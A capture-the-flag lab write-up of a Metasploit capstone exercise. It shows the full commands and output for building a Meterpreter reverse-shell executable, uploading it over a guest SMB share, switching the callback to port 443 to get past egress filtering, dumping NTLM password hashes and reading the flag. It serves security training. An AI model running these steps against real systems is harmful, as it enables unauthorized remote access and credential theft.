## Scenario

> This is the capstone for the Metasploit module. You will apply everything you have learned across all four rooms: generating a payload with msfvenom, setting up a handler, delivering the payload to a target, catching the session, and performing post-exploitation to retrieve a flag.
> 
> Your team has uncovered a guest-writable share on the target Windows machine. There is a scheduled task that will run and delete any executable files uploaded to this share. The team also uncovered that the target only allows outbound HTTP/S traffic.

Access via: `10.114.161.135`

## Generating the First Payload

Started by generating a stageless Windows Meterpreter EXE, pointed back at the attacking machine on the default port, 4444:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=—REDACTED— LPORT=4444 -f exe -o shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 255678 bytes
Final size of exe file: 262656 bytes
Saved as: shell.exe
```

**Breakdown:**

- `-p windows/x64/meterpreter_reverse_tcp` — the stageless Meterpreter payload, chosen per the room's own hint, for reliability
- `LHOST=—REDACTED—` — the attacking machine's own IP
- `LPORT=4444` — the port the handler would listen on
- `-f exe` — output as a Windows executable
- `-o shell.exe` — the output filename

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ ls

Desktop  Documents  Downloads  Music  Pictures  Public  shell.exe  Templates  Videos
```

`shell.exe` confirmed present in the home directory.

## Scanning the Target

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ sudo nmap 10.114.161.135 -Pn

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-11 14:39 +0200
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 29.91% done; ETC: 14:39 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 65.76% done; ETC: 14:39 (0:00:06 remaining)
Nmap scan report for 10.114.161.135
Host is up (0.035s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

**Breakdown:**

- `sudo` — runs `nmap` with elevated privileges, needed for its default SYN scan
- `nmap 10.114.161.135` — scans the target IP
- `-Pn` — skips host discovery and treats the host as up regardless, since ICMP may be filtered

Four ports came back open: `135` (MSRPC), `139` (NetBIOS), `445` (SMB), and `3389` (RDP) — consistent with the scenario's mention of a guest-writable share.

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ sudo nmap 10.114.161.135 -Pn -sV -sC -p135,139,445,3389

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-11 14:40 +0200
Nmap scan report for 10.114.161.135
Host is up (0.034s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-11T12:40:35+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CAPSTONE
|   NetBIOS_Domain_Name: CAPSTONE
|   NetBIOS_Computer_Name: CAPSTONE
|   DNS_Domain_Name: capstone
|   DNS_Computer_Name: capstone
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-11T12:40:15+00:00
| ssl-cert: Subject: commonName=capstone
| Not valid before: 2026-11-10T12:35:08
|_Not valid after:  2027-05-12T12:35:08
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-11-11T12:40:19
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.30 seconds
```

**Breakdown:**

- `-sV` — probes the open ports for service and version information
- `-sC` — runs Nmap's default script set against them
- `-p135,139,445,3389` — limits the scan to the four ports already found open, rather than rescanning the full range

This confirmed a Windows Server 2019 host (build `10.0.17763`), hostname `CAPSTONE`, in workgroup `CAPSTONE` rather than a domain.

## First Attempt: Handler and Delivery on Port 4444

With the target confirmed, the handler was checked and started:

```shell
msf exploit(multi/handler) > options

Payload options (windows/x64/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       —REDACTED—       yes       The listen address (an interface may be specified)
   LPORT       4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on —REDACTED—:4444 
```

`LHOST` and `LPORT` already matched the generated payload exactly, so no further `set` commands were needed before running.

The payload was then uploaded to the target's writable share:

```shell
msf auxiliary(admin/smb/upload_file) > options

Module options (auxiliary/admin/smb/upload_file):

   Name         Current Setting        Required  Description
   ----         ---------------        --------  -----------
   FILE_LPATHS                         no        A file containing a list of local files to utilize
   FILE_RPATHS                         no        A file containing a list remote files relative to the share to operate on
   LPATH        /home/—REDACTED—/shell.exe  no  The path of the local file to utilize
   RPATH        shell.exe              no        The name of the remote file relative to the share to operate on
   SMBSHARE     public                 yes       The name of a writeable share on the server


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     10.114.161.135   no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser    guest            no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.
```

`LPATH`, `RPATH`, `RHOSTS`, and `SMBUser` (defaulting to `guest`, matching the guest-writable share from the scenario) were already set correctly, so the module was run as-is:

```shell
msf auxiliary(admin/smb/upload_file) > run

[+] 10.114.161.135:445 - /home/—REDACTED—/shell.exe uploaded to shell.exe
[*] 10.114.161.135:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The upload succeeded. Checking the handler afterwards, though:

```shell
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on —REDACTED—:4444 
```

No session. No error either — just the handler sitting there listening, with nothing connecting back.

## Diagnosing the Failed Connection

Went back and read the scenario more carefully this time, and the line about the target only allowing outbound HTTP/S traffic stood out — port 4444 was never going to get through that. The payload executing on the target would have tried to reach `—REDACTED—:4444`, and the target's own outbound filtering would have dropped it before it ever reached the handler, which is exactly why nothing showed up on either end. The fix: generate the payload again with `LPORT` set to 443 instead, so the callback blends in with normal HTTPS egress.

## Second Attempt: Regenerating on Port 443

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=—REDACTED— LPORT=443 -f exe -o shell.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 255677 bytes
Final size of exe file: 262656 bytes
Saved as: shell.exe
```

The handler's `LPORT` was updated to match, and restarted:

```shell
msf exploit(multi/handler) > set LPORT 443

LPORT => 443

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on —REDACTED—:443 
```

The new payload — same filename, `shell.exe`, overwriting the one already on disk — was uploaded the same way as before:

```shell
msf auxiliary(admin/smb/upload_file) > run

[+] 10.114.161.135:445 - /home/—REDACTED—/shell.exe uploaded to shell.exe
[*] 10.114.161.135:445 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

With the scheduled task on the target set to run and execute uploaded files, no manual execution step was needed this time. Checking the handler again:

```shell
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on —REDACTED—:443 
[*] Meterpreter session 1 opened (—REDACTED—:443 -> 10.114.161.135:49909) at 2026-11-11 14:58:08 +0200

meterpreter > 
```

The session caught cleanly on 443, confirming the earlier diagnosis.

## Post-Exploitation

```shell
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

Already running as `SYSTEM`, so no privilege escalation was needed before dumping hashes:

```shell
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jim:1008:aad3b435b51404eeaad3b435b51404ee:—REDACTED—:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

`jim`'s NTLM hash was pulled directly from this output: `—REDACTED—`.

## Locating the Flag

```shell
meterpreter > search -d "C:\Users\Administrator" -f "*txt" 

Found 23 results...
===================

Path                                                                                                                                                                                              Size (bytes)  Modified (UTC)
----                                                                                                                                                                                              ------------  --------------
C:\Users\Administrator\AppData\Local\Microsoft\Internet Explorer\brndlog.txt                                                                                                                      6505          2021-03-17 17:13:27 +0200
C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Apps_{3557333d-ea25-4c9f-a61a-21f7b785c1eb}\0.0.filtertrie.intermediate.txt      14783         2026-05-15 11:11:58 +0300
—SNIP—
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt                                                                                            0             2026-02-17 20:39:01 +0200
C:\Users\Administrator\Documents\flag.txt   
```

**Breakdown:**

- `search` — Meterpreter's file search command
- `-d "C:\Users\Administrator"` — restricts the search to this directory and its subfolders
- `-f "*txt"` — matches any filename ending in `txt`

`flag.txt` turned up under `C:\Users\Administrator\Documents`:

```shell
meterpreter > cat "C:\Users\Administrator\Documents\flag.txt"

—REDACTED—
```

## Questions

### Question 1 — Generate a Meterpreter payload in .exe format.

**Answer:** `No answer needed`

### Question 2 — Transfer the payload to the target machine and catch a Meterpreter session on the target machine.

**Answer:** `No answer needed`

### Question 3 — Use a post-exploitation module to dump the password hashes of other users on the system. What is jim's NTLM hash?

**Answer:** `—REDACTED—`

### Question 4 — Find the flag somewhere in C:\Users\Administrator. What's its value?

**Answer:** `—REDACTED—`